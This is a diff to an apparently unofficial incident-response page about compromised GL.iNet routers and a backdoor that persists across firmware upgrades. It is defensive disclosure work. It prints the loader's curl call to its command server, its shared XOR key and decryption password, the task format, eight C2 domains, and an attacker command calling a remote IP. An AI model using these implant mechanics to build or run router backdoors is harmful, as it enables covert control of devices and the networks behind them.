@@ -55,7 +55,7 @@ nothing that identifies an owner, a network or a device. Every statement here sa
 from and how it was checked. Corrections and findings from anyone are welcome: see
 [CONTRIBUTING.md](CONTRIBUTING.md).
 
-**Last reviewed: 2026-11-23 17:42 UTC.** GL.iNet's notice changes; read
+**Last reviewed: 2026-11-23 18:17 UTC.** GL.iNet's notice changes; read
 [the current version](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056)
 as well.
 
@@ -88,9 +88,11 @@ This is not an official GL.iNet page and GL.iNet has not reviewed it.
    its VPN client profiles and SSH keys: access has to be removed on the server side as well. See
    [If you find something](#if-you-find-something).
 6. **GL.iNet has released fixed firmware for most router models. Install it, but do not treat it
-   as a clean-up.** Stable builds dated 22 and 23 November are in its listing for eleven router
+   as a clean-up.** Stable builds dated 22 and 23 November are in its listing for eighteen router
    models; see [Fixed firmware](#fixed-firmware). In the build we read, the handler that the
-   attack came through has gained input validation. The firmware's own clean-up is partial, and one
+   attack came through has gained input validation. The firmware's own clean-up is partial: in
+   our test, start-up entries it does not name survived an upgrade with settings kept and ran.
+   Other weaknesses remain ([docs/open-weaknesses.md](docs/open-weaknesses.md)), and one
    further weakness in the cloud client is not addressed in that build: we reported it to
    GL.iNet on 22 November and are not publishing it. A router that shows any sign still needs the steps in
    [If you find something](#if-you-find-something).
@@ -171,10 +173,14 @@ Full list with sources and evidence in [docs/findings.md](docs/findings.md). The
 | The earliest firmware in which we find that code is GL-MT3000 4.7.0, released 5 December 2024. The 4.6 images we read do not have it. It is still in GL-AXT1800 4.8.4 (beta of 11 November) and GL-MT3000 4.11.0 | Verified by us from the official images and from routers |
 | It runs whether or not AstroWarp / SD-WAN is enabled | Verified by us |
 | GL.iNet's fixed firmware adds input validation in that same handler, and a start-up clean-up that restores the file the older backdoor changes. It leaves one further weakness in the cloud client unaddressed in the build we read | Verified by us in the GL-MT3000 4.11.1 build; see [Fixed firmware](#fixed-firmware) |
-| The attacker used it on at least seven models: GL-AXT1800, GL-AX1800, GL-MT2500, GL-MT3000, GL-MT5000, GL-MT6000 and GL-MT3600BE, on firmware from 4.7.4 to 4.9.0 | Verified by us on routers we manage |
+| The attacker used it on at least eleven models: GL-AX1800, GL-AXT1800, GL-BE3600, GL-BE6500, GL-BE9300, GL-BE10000, GL-MT2500, GL-MT3000, GL-MT3600BE, GL-MT5000 and GL-MT6000, on firmware from 4.7.0 to 4.9.1 | Verified by us: the attacker's message was still in the memory of the cloud client on those routers; see [docs/attacker-messages.md](docs/attacker-messages.md) |
 | On GL-AXT1800 (firmware 4.8.2 and 4.8.3) and GL-MT6000 (firmware 4.9.1) it opened a root remote shell to `170.39.226.219`, starting between 20:06 and 21:40 UTC on 20 November. On routers that were not restarted the shell was still running, or still trying to reconnect, on 22 November | Verified by us on 24 routers we manage or own; two more reported by other owners |
-| On most routers it ran a single command as root and left only a firewall rule. We recovered the command from memory on seven routers: it looks for the folders of the KVM implant ("gl-helper") and sends the result to `170.39.226.219` | Verified by us; another owner recovered the same message independently |
+| On most routers it ran a single command as root and left only a firewall rule. We recovered that command from the memory of 98 routers: it looks for the folders of the KVM implant ("gl-helper") and sends the result to `170.39.226.219`. In all we recovered eight distinct messages: three forms of that check, the remote shell, three ways of ending the shell, and a call-back | Verified by us; another owner recovered the folder check independently |
+| The only thing we could recover that was typed into a remote shell is the same folder check, by hand, in 36 of 106 shell images; where the answer was still in memory the folder was not there | Verified by us |
+| The attack on routers and the KVM implant used the same server: one router was sent a command, through GL.iNet's cloud, that calls `http://66.245.219.252:8899/wake?m=KK_<id>`, the server, port and path of the KVM implant's own report | Verified by us on one router; the KVM side is reported by forum users; see [docs/gl-helper-implant.md](docs/gl-helper-implant.md) |
 | A separate, older backdoor is installed and running on 49 routers we manage (GL-MT2500, GL-MT3000, GL-MT6000, GL-AX1800 and GL-AXT1800; firmware 4.7.0 to 4.11.0), with file dates from September 2025 to May 2026. It was installed in batches on routers in unrelated networks, almost none of which has a public address. It starts at every boot and adds itself to the list of files kept across upgrades | Verified by us; first reported by forum users |
+| That backdoor's loader was built once per router, reports the router's serial number, addresses, model and firmware to its servers every three days, and fetches a second stage that can run any command, write any file and open a proxy into the network behind the router. On 47 routers the second stage had been checking in for up to six months and no task was in its memory when we captured it | Verified by us from 49 copies of each and 47 memory images of each; see [the loader](docs/older-backdoor-loader.md) and [the second stage](docs/older-backdoor-second-stage.md) |
+| The fixed firmware's clean-up removes the two start-up routes it names and nothing else: on a test router, other start-up entries placed in kept settings survived an upgrade with settings kept and ran | Verified by us on a GL-MT3000; see [Fixed firmware](#fixed-firmware) |
 | GL.iNet's published indicator, a `crond -i /tmp/.log` process, was not running on any router we checked, including all of the above | Verified by us |
 | The shells connected to `170.39.226.219`, a rented server at a US hosting provider with no named customer in the registry. We reported it to the provider on 21 November 2026; the provider replied the same day that it has suspended the server, notified its customer and preserved the data. On 22 November the address did not answer from any of 20 outside test points | Verified by us from public registries; see [docs/attacker-infrastructure.md](docs/attacker-infrastructure.md) |
 | The shell leaves one file behind, an empty `/etc/mp_ip_mapping_info`; the shell, its named pipe `/tmp/f` and the firewall rule are gone after a reboot | Verified by us |
@@ -202,13 +208,13 @@ names.
 | **Firewall rule** | `-A SDWAN_IP_MAPPING -d 127.0.0.1/32 -j DNAT --to-destination 127.0.0.1` in the NAT table | No. It is also gone once GoodCloud is switched off on the router, without a restart | The cloud client was sent the attacker's message and ran it as root. The rule itself is harmless; it is the wrapper the attacker's command arrived in |
 | **State file** | `/etc/mp_ip_mapping_info`, empty, dated 20 November 2026 or later, on a router that does not use AstroWarp | Yes | The same handler ran. It is the only trace left after a restart. It does not show what the message carried |
 | **Cloud log entry** | In the device log exported from your GoodCloud account: command responses containing `"astrowarp"` with the id `1`, where ordinary commands carry a 32-character id | Yes, it is kept on GL.iNet's side | The `virtual_ip_info` command was sent to that device, with the time. Reported by one owner; we have not checked it ourselves |
-| **Older backdoor** | Extra lines at the top of `/etc/init.d/urandom_seed`, a file `/bin/ulogd`, and an added line in `/lib/upgrade/keep.d/netifd`; when running, processes named `monitord` and `ujaild` | Yes; its keep-list line is there to carry it through upgrades that keep settings | A separate, earlier compromise, with file dates from October 2025 on. It starts at every boot and contacts its own servers |
-| **GL.iNet's indicator** | GL.iNet's check for a router is `ps \| grep tmp` over SSH (or search for `tmp/.log` in LuCI under Status → Processes); a hit is a line containing `crond -i /tmp/.log`. On a KVM it is `ps -aux \| grep tmp` (`ps -a \| grep tmp` on the RMQ1). All four are in [GL.iNet's own checks](#glinets-own-checks) | Not known to us | The one sign GL.iNet's notice tells owners to look for. It is reported to be the name the KVM installer gives its own process (findings K-9). We have not found it on any router |
+| **Older backdoor** | Extra lines at the top of `/etc/init.d/urandom_seed`, a file `/bin/ulogd`, and an added line in `/lib/upgrade/keep.d/netifd`; when running, processes named `monitord` and `ujaild` | Yes; its keep-list line is there to carry it through upgrades that keep settings | A separate, earlier compromise, with file dates from September 2025 on. It starts at every boot, reports to its own servers and fetches a remote-control program that runs from memory. See [The older backdoor, step by step](#the-older-backdoor-step-by-step) |
+| **GL.iNet's indicator** | GL.iNet's check for a router is `ps \| grep tmp` over SSH (or search for `tmp/.log` in LuCI under Status → Processes); a hit is a line containing `crond -i /tmp/.log`. On a KVM it is `ps -aux \| grep tmp` (`ps -a \| grep tmp` on the RMQ1). All four are in [GL.iNet's own checks](#glinets-own-checks) | Not known to us | The one sign GL.iNet's notice tells owners to look for. It is reported to be a false name that the KVM implant's helper writes over its own process ([docs/gl-helper-implant.md](docs/gl-helper-implant.md)). We have not found it on any router |
 
 How to read a combination:
 
-- **Rule or state file, nothing else:** the attacker's command ran on the router. On the routers
-  where we recovered it, that command only looked for another implant and reported back. Treat
+- **Rule or state file, nothing else:** the attacker's command ran on the router. On the 98
+  routers where we recovered it, that command only looked for another implant and reported back. Treat
   the router as reached by the attacker; we cannot show that nothing more was sent.
 - **Remote shell or shell pipe:** treat every key and password on the router as read.
 - **Older backdoor:** the same, and for much longer.
@@ -272,84 +278,100 @@ removal. We ran none of it. Full hashes and install dates are in the
 5. The loader fetches the second stage, writes it to `/tmp/ujaild`, starts it under the name
    `/usr/sbin/ujaild`, and the file in `/tmp` is deleted. On the router where we timed it the
    loader started 36 seconds after boot and the second stage about five minutes after boot.
-   That the loader does the fetching is from its saved memory, which holds a server's reply
-   telling it what to download. Forum users who decoded the bytecode describe the same thing in
-   detail (next part).
+   The next part describes how.
 
-**What the loader does.** Forum users decoded it first, in
-[this forum topic](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097);
-the points below credit their posts. On 23 November we decoded all 49 of our own copies and the
-memory of 47 running loaders, and confirmed every point below except where noted. The full
-account, field by field and command by command, with a decoder you can run on your own sample,
-is in [docs/older-backdoor-loader.md](docs/older-backdoor-loader.md).
+**What the loader does.** Verified by us on 23 November 2026 by decoding all 49 of our copies
+and reading the memory of 47 running loaders; nothing was run. Forum users decoded it first, in
+[this forum topic](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097), and their posts are credited where they found a point before we did.
+The full account, command by command, with a decoder you can run on your own sample, is in
+[docs/older-backdoor-loader.md](docs/older-backdoor-loader.md).
 
-- **It hides its text.** Every string is stored one character at a time as a value, a
-  position, an operation (add, subtract or xor) and a key, so a plain search of the file finds
-  no address or command. The bytecode is built with OpenWrt's patched Lua 5.1, which standard
-  decompilers refuse ([post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14)). The scrambling is redone for each build, which is why the file
-  has the same size and a different hash on every router ([post 39](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/39)); that matches our 49 files.
-- **At start** it restarts the system log service, which empties the log ([post 2](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/2), [post 1](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/1)), then
-  waits about five minutes ([post 1](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/1)); on our timed router the second stage started five minutes
-  after boot.
-- **It reports the router to a server.** It collects the serial number
-  (`/proc/gl-hw-info/device_sn`), hardware addresses, DDNS name, model, firmware type and
-  version, and uptime ([post 2](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/2), [post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14)). It also counts open terminal sessions in `/dev/pts`
-  and reads its parent process id, apparently to tell whether someone is logged in, and reads
-  the header of `/bin/ls` to learn the processor's byte order ([post 19](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/19)). It sends
-  `version=v2.1` and a 40-character identifier ([post 19](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/19)).
-- **How it talks to the server.** `curl -fsSkL --connect-timeout 10 -X POST` to a path
-  `/v1/gl/access`, with no certificate checking (`-k`) and no identifying header; everything
-  is inside the body ([post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14), [post 40](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/40)). The body is the text
-  `counter=<n>&randomkey=<id>&…`, XORed with a repeating 32-byte key and sent as upper-case
-  hexadecimal; the reply is protected the same way. The key is the same on every router:
-  `fe9d8e6705d3338031c2f3ab8d0cd0e7a929c8ab977d0e696dfe905e05f0f37b` ([post 40](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/40)). Anyone who
-  holds a capture of that traffic with the TLS layer removed can read it with that key.
-- **What the server answers.** A small JSON object with the fields `url`, `sleep`, `key`,
-  `args`, `quit` and `name` ([post 19](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/19), [post 41](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/41)). If `quit` is set, the loader exits. If `url` is
-  given, it downloads the file to `/tmp/<name>`; if `key` is given it decrypts it with
-  `openssl enc -d -aes-256-cbc -pbkdf2 -salt`, unzips it and makes it executable. It then
-  links `/usr/sbin/<name>` to `/tmp/<name>`, ends any running copy, starts it with the given
-  arguments, waits one second and deletes both the link and the file ([post 41](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/41)). With `name`
-  set to `ujaild` that is exactly the process we found: named `/usr/sbin/ujaild`, running from
-  `/tmp/ujaild (deleted)`.
-- **How often it checks in.** 7,200 seconds (two hours) in one decoded sample ([post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14)),
-  259,200 seconds (three days) in another ([post 22](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/22)).
-- **Two sets of servers, two waves.** The 33,722-byte loader decodes to
-  `cdn.adguardns.com` and `cdn.adguardns.org` ([post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14)). The larger, 35,745-byte loader, the
-  oldest reported (files dated October 2025, on a GL-X2000), decodes to three other names:
-  `cdn.lede-openproject.org`, `cdn.adxinsight.com` and `cdn.openwrt-project.org`, all with the
-  path `/v1/gl/access`, tried in random order ([post 2](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/2), [post 21](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/21)). We have the 35,745-byte loader
-  on 7 of our 49 routers and decoded all seven: the same three names.
-- **When the servers were set up** ([post 18](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/18), [post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14), from public registration and certificate
-  records): `lede-openproject.org` and `adxinsight.com` registered on 4 July 2025, eight
-  minutes apart at two registrars; `openwrt-project.org` on 18 August 2025, with certificates
-  for all three issued within eleven minutes the next morning; `adguardns.com` and
-  `adguardns.org` on 8 December 2025, 25 minutes apart. Two of the names had belonged to
-  someone else years before and were registered again after they lapsed. The five names sit
-  on three different pairs of Cloudflare name servers. Our earliest file date is 15 September 2025 and our
-  batches begin on 7 December 2025.
-- **Not every router gets the second stage.** One owner found the loader running and no
-  `ujaild` ([post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14)). On ours it was running on all 49: we copied it from the running process on
-  each.
-- **Models reported by others** beyond ours: GL-X2000 and GL-XE3000 ([post 2](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/2), [post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14)).
+- **It hides its text.** Every string is stored one character at a time as a value, a position,
+  an operation (add, subtract or xor) and a key, so a plain search of the file finds no address
+  or command. The file is Lua 5.1 as OpenWrt builds it, which standard decompilers refuse
+  (first described by UnhappyCloud, [post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14), and rdizzie, [post 39](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/39)).
+- **One file was built per router.** Copies of the same size differ in one place only: a
+  40-character identifier. It is different on each of our 49 routers and is not derived from
+  anything on the router. That is why the file has a different hash everywhere.
+- **At start** it exits if a copy is already running, restarts the system log service (which
+  empties the log), and, if the router has been up for less than ten minutes, waits five
+  minutes.
+- **It reports the router to a server,** in sixteen fields: a counter, its identifier, uptime,
+  the number of open terminal sessions, its parent process, the serial number, byte order,
+  processor type, every network interface's hardware address, the result of its last check-in,
+  the device's hardware address and DDNS name, the model, the firmware type and version, and
+  its own version, `v2.1`. It reads no VPN, Wi-Fi or password file.
+- **How it talks to the server.**
+  `curl -fsSkL --connect-timeout 10 -X POST -d "<hex>" "<server>/v1/gl/access"`, with certificate
+  checking off (`-k`). The body is the report XORed with a repeating 32-byte key and written as
+  upper-case hexadecimal; the reply is protected the same way. The key is the same in all 49
+  copies (first published by rdizzie, [post 40](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/40)):
+  `fe9d8e6705d3338031c2f3ab8d0cd0e7a929c8ab977d0e696dfe905e05f0f37b`.
+- **What the servers answered,** from the loaders' memory. Either "nothing to do":
+  `{"url":"","sleep":259200,"key":"","args":"","quit":false,"name":""}`, or a task: a download
+  address `https://<server>/v1/gl/download?token=<16 characters>`, the name `ujaild` and the
+  password `JHWmVqTwEryeXiAyXwEnCmKrQvRtnpxV`, the same for every router. A task reply was still
+  in memory on 26 of the 47. No reply told a router to stop.
+- **What it does with a task.** It downloads the file to `/tmp/ujaild`, decrypts it with
+  `openssl enc -d -aes-256-cbc -pbkdf2 -salt` and that password, unzips it, links
+  `/usr/sbin/ujaild` to it, ends any copy already running, starts it, waits one second and
+  deletes both the link and the file. That is exactly the process we found: named
+  `/usr/sbin/ujaild`, running from `/tmp/ujaild (deleted)`.
+- **How often it checks in.** Every 259,200 seconds (three days): that is what the servers sent
+  in every reply we recovered. 7,200 seconds (two hours) is the loader's own fallback when it
+  gets no usable answer. Forum users saw one value each ([post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14), [post 22](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/22));
+  both are right.
+- **Two sets of servers.** The 33,722-byte loader (42 routers) uses `cdn.adguardns.com` and
+  `cdn.adguardns.org`. The 35,745-byte loader (7 routers) uses `cdn.lede-openproject.org`,
+  `cdn.adxinsight.com` and `cdn.openwrt-project.org` (first decoded by acs, [post 2](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/2)). It
+  shuffles its list at every start and tries each in turn.
+- **What it does not do.** It holds no code that writes the VPN server settings, the account
+  files, the upgrade keep list or a scheduled task. Its only job is to report and to fetch.
+- **When the servers were set up** (Reported by rdizzie, [post 18](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/18), and UnhappyCloud,
+  [post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14), from public registration and certificate records): `lede-openproject.org`
+  and `adxinsight.com` registered on 4 July 2025, eight minutes apart at two registrars;
+  `openwrt-project.org` on 18 August 2025, with certificates for all three issued within eleven
+  minutes the next morning; `adguardns.com` and `adguardns.org` on 8 December 2025, 25 minutes
+  apart. Two of the names had belonged to someone else years before and were registered again
+  after they lapsed. Our earliest file date is 15 September 2025 and our batches begin on
+  7 December 2025.
+- **Not every router gets the second stage** (Reported). One owner found the loader running and
+  no `ujaild` ([post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14)). On ours it was running on all 49.
+- **Models reported by others** beyond ours: GL-X2000 and GL-XE3000 ([post 2](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/2),
+  [post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14)).
 
-**The second stage.** `ujaild` is a single self-contained program for 64-bit ARM, 6.8 MB,
-written in Go, with its symbols removed. Because its file is deleted once it runs, the only
-copy is the one in memory; we took ours from the running process on each router. It has only
-two versions over the 49 routers (SHA-256 `311b5767e7d63e7dbdc1476c36608b8d7ef729c8bbcc64ded63b9470396351d6`
-on 42 and `53736d5db721a358bec5b9ddf6056df73b36fc5330300342c42f866a05191432` on 7). Forum users
-report that it gives its operator remote control of the router and a proxy into the network
-behind it; one found the names of a multiplexing library (`yamux`), `socks5` and `proxy` in its
-text ([post 2](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/2)). Another reports that only one of the scanners on VirusTotal flagged
-it ([post 22](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/22)). On 23 November we read both
-builds and the memory of 47 running copies ourselves: it takes four kinds of task from its server
-(run a program, write a file, write and run, forward traffic through a SOCKS5 proxy), its server
-names are `up.adguardns.com`, `up.adguardns.org` and `up.adsanalypro.com`, and no task was in
-memory on any of the 47 when we captured them (finding R-30; full page: [docs/older-backdoor-second-stage.md](docs/older-backdoor-second-stage.md)).
+**The second stage.** Verified by us on 23 November 2026 by reading both builds and the memory
+of 47 running copies; full page:
+[docs/older-backdoor-second-stage.md](docs/older-backdoor-second-stage.md).
 
-**Its servers.** In the saved memory of the loader and the second stage: `cdn.adguardns.com`,
-`cdn.adguardns.org`, `up.adguardns.com` and `up.adguardns.org`, still answering on 21 November
-2026. The names imitate AdGuard; nothing we have links them to AdGuard.
+- `ujaild` is one self-contained program for 64-bit ARM, 6.8 MB, written in Go and hidden with
+  the `garble` tool. Its file is deleted once it runs, so the only copy is the one in memory; we
+  took ours from the running process on each router.
+- Two builds over the 49 routers: SHA-256
+  `311b5767e7d63e7dbdc1476c36608b8d7ef729c8bbcc64ded63b9470396351d6` on 42 and
+  `53736d5db721a358bec5b9ddf6056df73b36fc5330300342c42f866a05191432` on 7, the same seven that
+  have the larger loader.
+- It takes four kinds of task from its server: run a program, write a file, write a file and
+  run it, and forward traffic (a SOCKS5 proxy into the network behind the router). It can also
+  be told to exit. acs first noticed the proxy library names in it ([post 2](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/2)).
+- It holds no code of its own for VPN settings, passwords, SSH keys or the firewall. With "run
+  a program" its operator does not need any.
+- Its server addresses are stored encrypted in the file. Decrypted:
+  `https://up.adguardns.com/v1/gl/instance` and `https://up.adguardns.org/v1/gl/instance` in
+  the first build, `https://up.adsanalypro.com/v1/gl/instance` in the second. The last name had
+  not been reported anywhere when we published it.
+- In memory on the 47: check-in counters up to 366, server dates from 23 May 2026 to
+  22 November 2026, and no task and no forwarding on any of them at the time of capture. Memory
+  keeps only what the program still holds, so that is not proof that none was ever given.
+- HubertCumberdale reports that only one of the scanners on VirusTotal flagged it
+  ([post 22](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/22)).
+
+**Its servers, all eight names.** `cdn.adguardns.com`, `cdn.adguardns.org`,
+`cdn.lede-openproject.org`, `cdn.adxinsight.com`, `cdn.openwrt-project.org` (loader);
+`up.adguardns.com`, `up.adguardns.org`, `up.adsanalypro.com` (second stage). The servers were
+answering our routers until we removed the backdoor on 22 November 2026. The names imitate
+AdGuard, OpenWrt and an advertising service; nothing we have links them to those. If your DNS
+resolver keeps a query log, search it for these names.
 
 **Why it stays out of sight.**
 
@@ -390,7 +412,9 @@ keys on such a router as read.
 **Are the file dates real?** Our install dates are the routers' own file times. One owner's
 weekly backups show the files absent in one backup and present in the next, matching the file
 times ([post 31](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/31)). Admon notes that the attacker in this incident sets file times to blend in
-([post 26](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/26)); that may refer to the other malware. Treat the dates as probably right, not proven.
+([post 26](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/26)). The KVM implant's installer has an option that does exactly that
+([docs/gl-helper-implant.md](docs/gl-helper-implant.md)); nothing in this backdoor's loader or
+second stage does. Treat the dates as probably right, not proven.
 
 **What we do not know.** How it was installed (see the technical breakdown for the batches and
 dates). What rewrites the VPN server settings file at install time: neither the loader nor the
